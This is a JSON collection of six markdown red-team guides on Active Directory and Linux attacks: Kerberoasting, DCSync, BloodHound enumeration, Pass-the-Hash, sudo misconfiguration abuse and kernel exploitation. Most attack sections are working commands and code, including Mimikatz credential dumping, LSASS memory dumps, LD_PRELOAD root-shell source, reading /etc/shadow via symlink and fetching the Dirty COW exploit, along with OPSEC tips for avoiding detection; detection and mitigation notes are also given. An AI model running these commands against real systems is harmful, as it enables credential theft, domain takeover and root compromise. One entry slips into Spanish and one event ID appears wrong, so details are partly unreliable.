{
  "id": -1,
  "title": "active_directory_exploitation_testing",
  "documents": [
    {
      "name": "Kerberoasting Attack",
      "content": "# Kerberoasting Attack\n\nKerberoasting is an attack technique that targets Kerberos service accounts in Active Directory environments. It allows an attacker to request service tickets for any service with a registered SPN (Service Principal Name) and crack them offline to recover the service account password.\n\n**Prerequisites:**  - Valid domain user credentials  - Network access to the domain\n\n**Detection Methods:**  - Windows Event ID 4669 (A Kerberos service ticket was requested)  - Unusual number of 4769 events with encryption type 0x17 (RC4-HMAC)  - TGS requests for multiple services from a single user account\n\n**Execution Steps:** 1. **PowerView Method** \u2013 Load PowerView:  <pre><code class='powershell'>Import-Module .\\PowerView.ps1</code></pre>  Find all user accounts with SPNs:  <pre><code class='powershell'>Get-DomainUser -SPN | select samaccountname,serviceprincipalname</code></pre>  Request TGS tickets:  <pre><code class='powershell'>Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat</code></pre> 2. **Built-in Windows Tools Method** \u2013 Find SPNs associated with user accounts:  <pre><code class='powershell'>setspn -q */*</code></pre>  Use Rubeus to request and extract tickets:  <pre><code class='powershell'>.\\Rubeus.exe kerberoast /outfile:hashes.txt</code></pre> 3. **Impacket Method (from Linux)** \u2013 Find SPNs and request tickets:  <pre><code class='bash'>python GetUserSPNs.py -dc-ip 192.168.1.10 domain.local/username:password -outputfile hashes.txt</code></pre>\n\n**Cracking the Tickets:**  <pre><code class='bash'>Using Hashcat\nhashcat -m 13100 -a 0 hashes.txt wordlist.txt --force</code></pre>\n\n**Mitigation Strategies:**  - Use strong, complex passwords (>25 characters) for service accounts  - Implement AES encryption (AES256_HMAC) instead of RC4-HMAC  - Apply time-based Group Managed Service Accounts (gMSA) where possible  - Monitor for Event ID 4669 with encryption type 0x17 (RC4-HMAC)  - Implement a tiered administration model to limit exposure of privileged accounts",
      "topics": [
        "active-directory",
        "credential-access",
        "kerberos",
        "lateral-movement",
        "privilege-escalation"
      ],
      "source_type": "markdown",
      "metadata": {
        "source_type": "markdown"
      }
    },
    {
      "name": "DCSync Attack",
      "content": "# DCSync Attack\n\nThe DCSync attack mimics the behavior of a domain controller and requests account password data from the targeted domain controller. This technique leverages the Directory Replication Service Remote Protocol (MS-DRSR) to retrieve password hashes for domain accounts.\n\nPrerequisites: - Domain user with DCSync privileges (typically Domain Admins, Administrators, or Enterprise Admins) - Network access to a domain controller\n\nRequired Permissions: To perform DCSync, an account needs the following rights on the domain object: - DS-Replication-Get-Changes (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2) - DS-Replication-Get-Changes-All (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2) - DS-Replication-Get-Changes-In-Filtered-Set (GUID: 89e95b76-444d-4c62-991a-0facbeda640c)\n\nDetection Methods: - Windows Event ID 4662 (An operation was performed on an object) - Replication requests from non-domain controllers - SECURITY logs with appropriate GUID accesses\n\nExecution Steps: 1. Mimikatz - Extraer hash NTLM para un usuario espec\u00edfico: ```powershell\nlsadump::dcsync /domain:domain.local /user:Administrator\n``` - Extraer hashes NTLM para todos los usuarios del dominio: ```powershell\nlsadump::dcsync /domain:domain.local /all\n``` 2. Empire/PowerShell - Agregar ACL para DCSync: ```powershell\nAdd-DomainObjectAcl -TargetIdentity \"DC=domain,DC=local\" -PrincipalIdentity attacker -Rights DCSync\n``` - Ejecutar Mimikatz: ```powershell\nInvoke-Mimikatz -Command '\"lsadump::dcsync /domain:domain.local /user:Administrator\"'\n``` 3. Impacket (Linux) - Extraer hash para un usuario espec\u00edfico: ```bash\npython secretsdump.py domain.local/user:password@192.168.1.10 -just-dc-user Administrator\n``` - Extraer todos los hashes del dominio: ```bash\npython secretsdump.py domain.local/user:password@192.168.1.10 -just-dc-ntlm\n```\n\nOPSEC Considerations: - DCSync generates specific event logs that are easily identifiable - Use accounts that already have replication rights to avoid modifying ACLs - Conduct the attack during normal business hours when replication traffic is expected - Target domain controllers that have less monitoring if possible\n\nMitigation Strategies: - Monitor for Event ID 4662 with the specific GUIDs related to replication - Restrict and monitor accounts with replication permissions - Implement Protected Users security group for privileged accounts - Use Advanced Threat Analytics (ATA) or similar tools to detect abnormal replication requests - Regular security review of accounts with sensitive privileges",
      "topics": [
        "active-directory",
        "credential-access",
        "lateral-movement",
        "domain-controllers"
      ],
      "source_type": "markdown",
      "metadata": {
        "source_type": "markdown"
      }
    },
    {
      "name": "BloodHound for Active Directory Enumeration",
      "content": "# BloodHound for Active Directory Enumeration\n\nBloodHound is an Active Directory reconnaissance tool that uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. BloodHound can quickly identify complex attack paths that would otherwise be impossible to identify manually.\n\nComponents: - **Collectors (Ingestors)**: Data collection tools that gather information from Active Directory - **Neo4j Database**: Graph database that stores and processes the collected data - **BloodHound UI**: Frontend interface for visualizing and querying the data\n\nAvailable Collectors: - **SharpHound (C#)**: Main Windows-based collector - **BloodHound.py (Python)**: Cross-platform alternative collector - **AzureHound (PowerShell)**: Azure/M365 data collector\n\nData Collection Methods: 1. **Using SharpHound** \u2013 Import SharpHound module: ```powershell\nImport-Module .\\SharpHound.ps1\n``` - Basic collection with default methods: ```powershell\nInvoke-BloodHound -CollectionMethod All -OutputDirectory C:\\BloodHound\n``` - Stealth collection (reduces noise): ```powershell\nInvoke-BloodHound -CollectionMethod DCOnly,Session,LoggedOn -NoSaveCache -RandomFilenames -EncryptZip\n``` - From SharpHound.exe: ```powershell\n.\\SharpHound.exe --CollectionMethod All --OutputDirectory C:\\BloodHound\n``` 2. **Using BloodHound.py (from Linux)** \u2013 Basic collection: ```bash\npython bloodhound.py -c All -u username -p password -d domain.local\n``` - With LDAP connection: ```bash\npython bloodhound.py -c All -u username -p password -d domain.local --dns-tcp -dc dc01.domain.local\n```\n\nOPSEC Considerations: - SharpHound creates network noise through LDAP, DCE/RPC, and SMB traffic - Data collection creates log entries on domain controllers (Event IDs 4662, 4672, 4768, etc.) - SharpHound.exe may be flagged by antivirus or EDR solutions - Running with domain admin privileges may trigger alerts for privileged account misuse\n\nLow-Noise Collection Strategies: - Use the **DCOnly** collection method to reduce endpoint enumeration - Leverage **Session** method during business hours when authentication traffic is normal - Employ staggered collection over multiple days - Run from multiple machines with different non-privileged accounts - Use the `-SteathSource` parameter to limit source systems in session collection\n\nUseful BloodHound Queries: - **Find all Domain Admins**: `MATCH (n:User) WHERE n.admincount=True RETURN n` - **Find Shortest Path to Domain Admins**: `MATCH (n:Computer),(m:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}),p=shortestPath((n)-[*1..]->(m)) RETURN p` - **Find Kerberoastable Users**: `MATCH (n:User) WHERE n.hasspn=true RETURN n`\n\nDefensive Measures: - Monitor for SharpHound-specific User Agent strings in LDAP queries - Detect excessive LDAP queries, especially those enumerating privileged groups - Look for abnormal patterns of SAMR, LDAP, and Kerberos requests from non-administrative systems - Monitor for `.zip` files with BloodHound-related names - Implement network segmentation to limit lateral movement capabilities - Use privileged access workstations (PAWs) for administrative activities - Regularly audit and remove excessive rights in the directory",
      "topics": [
        "active-directory",
        "reconnaissance",
        "enumeration",
        "bloodhound"
      ],
      "source_type": "markdown",
      "metadata": {
        "source_type": "markdown"
      }
    },
    {
      "name": "Pass-the-Hash Attack",
      "content": "# Pass-the-Hash Attack\n\nPass-the-Hash (PtH) is a technique that allows an attacker to authenticate to a remote system or service using the NTLM hash of a user's password instead of the actual password. This attack exploits the NTLM authentication protocol's design where the hash itself is used for authentication.\n\nPrerequisites: - NTLM hash of a valid user account - Network connectivity to the target system - Target system must accept NTLM authentication\n\nDetection Methods: - Windows Event ID 4624 (Successful Logon) with Logon Type 3 and unusual source systems - Event ID 4625 (Failed Logon) patterns indicating brute force attempts - Authentication from a system where the user has not logged on interactively - Multiple logons from the same account coming from different systems in a short timeframe\n\nExecution Steps: 1. **Using Mimikatz** \u2013 Pass-the-Hash using Mimikatz: ```powershell\nLaunch Mimikatz with elevated privileges\n\nPass-the-Hash using Mimikatz\nsekurlsa::pth /user:Administrator /domain:domain.local /ntlm:e2b475c11da2a0748290d87aa966c327 /run:cmd.exe\n``` 2. **Using Impacket (from Linux)** \u2013 Using PsExec: ```bash\npython psexec.py -hashes :e2b475c11da2a0748290d87aa966c327 domain.local/Administrator@192.168.1.10\n``` - Using WMIExec: ```bash\npython wmiexec.py -hashes :e2b475c11da2a0748290d87aa966c327 domain.local/Administrator@192.168.1.10\n``` - Using SMBExec: ```bash\npython smbexec.py -hashes :e2b475c11da2a0748290d87aa966c327 domain.local/Administrator@192.168.1.10\n``` 3. **Using CrackMapExec (from Linux)** \u2013 Test authentication across multiple systems: ```bash\ncrackmapexec smb 192.168.1.0/24 -u Administrator -H e2b475c11da2a0748290d87aa966c327\n``` - Execute commands: ```bash\ncrackmapexec smb 192.168.1.10 -u Administrator -H e2b475c11da2a0748290d87aa966c327 -x \"whoami\"\n```\n\nObtaining NTLM Hashes: Local SAM Database: ```powershell\nUsing Mimikatz\nlsadump::sam\n\nUsing reg.exe and offline extraction\nreg save HKLM\\SAM sam.save\nreg save HKLM\\SYSTEM system.save\n Then extract with secretsdump.py or similar tools\n``` LSASS Memory: ```powershell\nUsing Mimikatz\nsekurlsa::logonpasswords\n\nUsing procdump and offline extraction\nprocdump.exe -ma lsass.exe lsass.dmp\n Then extract with Mimikatz: sekurlsa::minidump lsass.dmp followed by sekurlsa::logonpasswords\n```\n\nOPSEC Considerations: - NTLM authentication generates event logs - Unusual lateral movement patterns may trigger alerts - Many security tools specifically monitor for Pass-the-Hash attacks - Using privileged accounts may generate additional alerts\n\nMitigation Strategies: - Implement the Protected Users security group for privileged accounts - Enable Windows Credential Guard to prevent credential harvesting - Use Restricted Admin mode for Remote Desktop connections - Implement Local Administrator Password Solution (LAPS) - Segment networks and implement tiered administration - Require multi-factor authentication for sensitive systems - Monitor for unusual authentication patterns and lateral movement - Disable NTLM authentication where possible and use Kerberos",
      "topics": [
        "active-directory",
        "credential-access",
        "lateral-movement",
        "ntlm",
        "authentication"
      ],
      "source_type": "markdown",
      "metadata": {
        "source_type": "markdown"
      }
    },
    {
      "name": "SUDO Misconfiguration Exploitation",
      "content": "# SUDO Misconfiguration Exploitation\nSUDO misconfigurations are common privilege escalation vectors on Linux systems. When configured improperly, the sudo utility can allow users to execute commands with elevated privileges, potentially leading to complete system compromise. Below you will find the details and examples without any titles or subtitles.\n\nChecking SUDO Permissions:  \n<pre><code class=\"bash\"># List current user's sudo permissions\nsudo -l\n\n# Check sudoers file (requires root or sudo)\ncat /etc/sudoers\n\n# Check sudoers.d directory (requires root or sudo)\nls -la /etc/sudoers.d/\ncat /etc/sudoers.d/*\n</code></pre>\n\nAllowed Commands with Wildcards:  \n<pre><code class=\"bash\"># Example of dangerous sudoers entry\n# username ALL=(ALL) NOPASSWD: /usr/bin/find\n# username ALL=(ALL) NOPASSWD: /usr/bin/*\n\n# Check for wildcards in sudo -l output\nsudo -l | grep \"*\"\n</code></pre>\n\nEnvironment Variable Preservation:  \n<pre><code class=\"bash\"># Look for entries with the \"env_keep\" option\nsudo -l | grep env_keep\n\n# Check if SETENV or !SETENV is present in the output\nsudo -l | grep -E 'SETENV|!SETENV'\n</code></pre>\n\nCommands That Can Spawn Shells:  \n<pre><code class=\"bash\"># Look for markdown editors, utilities that can spawn shells\nsudo -l | grep -E 'vi|vim|nano|less|more|man|python|perl|ruby|bash|sh|csh|ksh|zsh'\n</code></pre>\n\nExploiting Allowed Binaries with Text Editors:  \n<pre><code class=\"bash\"># Spawn a shell from vim\nsudo vim -c ':!/bin/bash'\n\n# Spawn a shell from nano\nsudo nano\n^R^X # (Ctrl+R then Ctrl+X)\nreset; sh 1>&0 2>&0\n</code></pre>\n\nExploiting Allowed Binaries with Command Utilities:  \n<pre><code class=\"bash\"># Spawn a shell from less/more/man\nsudo less /etc/hosts\n!/bin/bash\n\n# Using find\nsudo find / -name example -exec /bin/bash \\;\n\n# Using python\nsudo python -c 'import os; os.system(\"/bin/bash\")'\n</code></pre>\n\nFor a comprehensive list of binaries that can be abused for privilege escalation, visit https://gtfobins.github.io/\n\nExploiting Environment Variables using LD_PRELOAD:  \n<pre><code class=\"bash\"># LD_PRELOAD exploitation\ncat << EOF > /tmp/shell.c\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setgid(0);\n    setuid(0);\n    system(\"/bin/bash\");\n}\nEOF\n\n# Compile the shared object\ngcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles\n\n# Use LD_PRELOAD with an allowed command\nsudo LD_PRELOAD=/tmp/shell.so find\n</code></pre>\n\nExploiting Wildcards (if a user can run /usr/bin/* with sudo):  \n<pre><code class=\"bash\"># Create a malicious script in /tmp\necho '#!/bin/bash' > /tmp/shell.sh\necho 'bash -i' >> /tmp/shell.sh\nchmod +x /tmp/shell.sh\n\n# Create a symlink in allowed directory\nln -s /tmp/shell.sh /usr/bin/shell\n\n# Execute with sudo\nsudo shell\n</code></pre>\n\nReal-World Example (Apache User with Wildcard Permission):  \n<pre><code class=\"bash\"># Sudoers configuration\n# apache ALL=(ALL) NOPASSWD: /bin/cat /var/www/html/*\n\n# Exploitation: Create a symlink to /etc/shadow and read the shadow file\nln -s /etc/shadow /var/www/html/shadow.txt\nsudo /bin/cat /var/www/html/shadow.txt\n</code></pre>\n\nReal-World Example (User with LD_LIBRARY_PATH):  \n<pre><code class=\"bash\"># Sudoers configuration\n# user ALL=(ALL) NOPASSWD: /usr/bin/apache2 -f /etc/apache2/apache2.conf\n# Sudo configuration preserves LD_LIBRARY_PATH\n\n# Exploitation: Create a shared object to spawn a shell\ncat << EOF > /tmp/libcrypt.c\n#include <stdio.h>\n#include <stdlib.h>\n\nstatic void hijack() __attribute__((constructor));\n\nvoid hijack() {\n    system(\"/bin/bash\");\n}\nEOF\n\n# Compile the shared object\ngcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/libcrypt.c\n\n# Use LD_LIBRARY_PATH with the allowed command\nsudo LD_LIBRARY_PATH=/tmp apache2 -f /etc/apache2/apache2.conf\n</code></pre>\n\nOPSEC Considerations: SUDO commands are typically logged in the auth.log file; suspicious commands or patterns may trigger security alerts; creating files or symlinks in world-writeable directories is often monitored; unusual environment variable settings may be flagged by security monitoring.\n\nMitigation Strategies: Avoid using wildcards in SUDO rules; restrict the commands users can run with SUDO to only those necessary; use absolute paths in SUDO configurations; restrict environment variable preservation in sudoers (env_reset, !env_keep); implement SUDO command logging and alerting; use SUDO lecture messages to remind users about proper usage; regularly audit SUDO configurations for potential security issues; consider using more granular access control mechanisms like SELinux or AppArmor.\n",
      "topics": [
        "privilege-escalation",
        "linux",
        "sudo",
        "defense-evasion"
      ],
      "source_type": "markdown",
      "metadata": {
        "source_type": "markdown"
      }
    },
    {
      "name": "Linux Kernel Exploitation",
      "content": "# Linux Kernel Exploitation\n\nLinux kernel vulnerabilities can provide attackers with a pathway to escalate privileges from a standard user to root. Kernel exploits target flaws in the core operating system components, allowing them to bypass traditional security controls.\n\nVulnerability Identification \u2013 System Information Gathering:  \n<pre><code class=\"bash\"># Kernel version information\nuname -a\ncat /proc/version\ncat /etc/issue\n\n# Distribution-specific version information\nlsb_release -a\ncat /etc/*-release\n\n# Installed kernel packages\nrpm -qa | grep kernel    # For RPM-based systems\ndpkg -l | grep linux-image    # For Debian-based systems\n</code></pre>\n\nVulnerability Identification \u2013 Common Vulnerable Configurations:  \n<pre><code class=\"bash\"># Check for vulnerable kernel modules\nlsmod\n\n# Check for enabled security features\ncat /boot/config-$(uname -r) | grep CONFIG_SECURITY\ncat /boot/config-$(uname -r) | grep CONFIG_SECCOMP\ncat /proc/cpuinfo | grep flags | grep -E 'smep|smap'\n\n# Check for exploit mitigations\nchecksec --kernel\ncat /proc/sys/kernel/unprivileged_bpf_disabled\ncat /proc/sys/kernel/kexec_load_disabled\ncat /proc/sys/kernel/dmesg_restrict\n</code></pre>\n\nCommon Kernel Exploit Categories \u2013 Use-After-Free (UAF): Occurs when the kernel continues to use memory after it has been freed, allowing attackers to manipulate memory to execute arbitrary code.\n\nCommon Kernel Exploit Categories \u2013 Race Conditions: Timing vulnerabilities where the kernel makes incorrect assumptions about the state of resources during concurrent operations.\n\nCommon Kernel Exploit Categories \u2013 Memory Corruption: Vulnerabilities that allow attackers to write to arbitrary memory locations, potentially overwriting critical kernel data structures.\n\nCommon Kernel Exploit Categories \u2013 Integer Overflows/Underflows: Mathematical errors in kernel code that can lead to buffer overflows or other memory corruption issues.\n\nExploitation Process \u2013 Finding Suitable Exploits:  \n<pre><code class=\"bash\"># Search for kernel exploits based on version\nsearchsploit linux kernel $(uname -r)\n\n# Check exploit-db\nExploit: https://www.exploit-db.com/exploits/[exploit-id]\n\n# Check established repositories\ngit clone https://github.com/xairy/kernel-exploits\ngit clone https://github.com/SecWiki/linux-kernel-exploits\n</code></pre>\n\nExploitation Process \u2013 Exploit Modification and Compilation:  \n<pre><code class=\"bash\"># Install development tools if needed\napt-get install -y build-essential libelf-dev linux-headers-$(uname -r)   # Debian/Ubuntu\nyum groupinstall \"Development Tools\"   # CentOS/RHEL\n\n# Compile the exploit\ngcc -o exploit exploit.c\n\n# For more complex exploits with a Makefile\nmake\n</code></pre>\n\nExploitation Process \u2013 Common Exploit Examples \u2013 CVE-2016-5195 (Dirty COW):  \n<pre><code class=\"bash\"># Download the exploit\nwget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c\n\n# Compile\ngcc -pthread pokemon.c -o dirtycow\n\n# Run the exploit\n./dirtycow /etc/passwd 0\n</code></pre>\n\nExploitation Process \u2013 Common Exploit Examples \u2013 CVE-2021-3156 (Sudo Baron Samedit):  \n<pre><code class=\"bash\"># Clone the repository\ngit clone https://github.com/blasty/CVE-2021-3156.git\ncd CVE-2021-3156\n\n# Compile and run\nmake\n./sudo-hax-me-a-sandwich\n</code></pre>\n\nOPSEC Considerations: Kernel exploits can crash the system if they fail; failed exploitation attempts often leave traces in system logs; many kernel exploits require specific conditions to work correctly; successful exploits may trigger security monitoring tools that detect privilege escalation; consider using stable, well-tested exploits to minimize system impact.\n\nMitigation Strategies: Keep the kernel and system packages updated with security patches; enable kernel security features like SMEP, SMAP, and KASLR; configure SELinux or AppArmor to restrict process capabilities; implement proper user privilege separation; use secure boot mechanisms to validate kernel integrity; monitor for suspicious process activity and privilege escalation; implement robust system auditing and log analysis; apply the principle of least privilege for all user accounts.\n",
      "topics": [
        "privilege-escalation",
        "linux",
        "kernel-exploitation",
        "defense-evasion"
      ],
      "source_type": "markdown",
      "metadata": {
        "source_type": "markdown"
      }
    }
  ],
  "topics": [
    "kerberos",
    "defense-evasion",
    "ntlm",
    "lateral-movement",
    "enumeration",
    "active-directory",
    "sudo",
    "authentication",
    "linux",
    "credential-access",
    "reconnaissance",
    "domain-controllers",
    "kernel-exploitation",
    "privilege-escalation",
    "bloodhound"
  ]
}